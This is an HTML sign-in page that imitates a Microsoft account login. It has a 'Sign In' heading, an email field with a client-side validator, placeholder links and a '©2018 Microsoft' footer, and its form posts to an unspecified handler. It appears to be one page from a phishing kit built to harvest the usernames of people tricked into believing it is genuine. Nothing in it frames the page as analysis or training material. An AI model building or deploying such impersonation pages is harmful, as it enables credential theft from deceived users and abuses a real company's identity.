<!DOCTYPE html><html class=" js flexbox flexboxlegacy canvas canvastext no-webgl touch no-geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent no-video no-audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" style=""><head>
	<meta charset="utf-8">
	<title>Sign in to your account</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<link rel="stylesheet" type="text/css" href="css/page-style.css">
	<!--<link rel="stylesheet" type="text/css" href="css/style.css">-->
	<!--<link rel="stylesheet" type="text/css" href="css/main.css">-->
	<script type="text/javascript" src="script/all.js"></script>
	<script type="text/javascript" src="script/modernizr.js"></script>
	<script type="text/javascript" src="script/jquery.min.js"></script>
	<script type="text/javascript">
		function isValidEmailAddress( emailAddress ) {
			var pattern = new RegExp( /^(("[\w-\s]+")|([\w-]+(?:\.[\w-]+)*)|("[\w-\s]+")([\w-]+(?:\.[\w-]+)*))(@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][0-9]\.|1[0-9]{2}\.|[0-9]{1,2}\.))((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\.){2}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\]?$)/i );
			return pattern.test( emailAddress );
		};

		$( function () {

			$( document ).ready( function () {
				$( "#login-signin" ).click( function () {
					$( '#loader' ).show();

					if ( !isValidEmailAddress( $( '#login-username' ).val() ) ) {
						$( '#login-username' ).addClass( "error" );
						$( '#username-error' ).show();
						$( '#username-error' ).text( 'Enter a valid email.' );
						$( '#loader' ).hide();

						$( '#login-username' ).on( 'input', function () {
							$( '#login-username' ).removeClass( 'error' );
							$( '#username-error' ).hide();
						} );
						return false;
					}

				} );
			} );
		} );
	</script>
</head>

<body>
	<div class="overlay">
		<div class="login-box">
			<img src="data:image/png;base64," alt="logo">


			<h2 id="title" style="font-weight: 300; font-size: 1.5rem; line-height: 1.75rem;">Sign In</h2>
			<div id="loader" class="loader hidden">
				<div class="circle"></div>
				<div class="circle"></div>
				<div class="circle"></div>
				<div class="circle"></div>
				<div class="circle"></div>
			</div>

			<form action="" method="POST">
			<p id="username-error" class="row error hide" role="alert"></p>
				<input id="login-username" name="username" type="email" placeholder="someone@example.com" value="" autocapitalize="none" autocorrect="off" autofocus="">
				<input id="login-signin" type="submit" name="signin" value="Next">
			</form>
			<br>

			<div id="group2">
				<small id="fps"><a href="#" class="fade">Can't access your account?</a></small>
				<br>
				<br>
			</div>
		</div>
	</div>

	<footer>
		<ul>
			<li><a href="#">Privacy &amp; cookies</a>
			</li>
			<li><a href="#">Terms of use</a>
			</li>
			<li><a>©2018 Microsoft</a>
			</li>
		</ul>
	</footer>



</body></html>
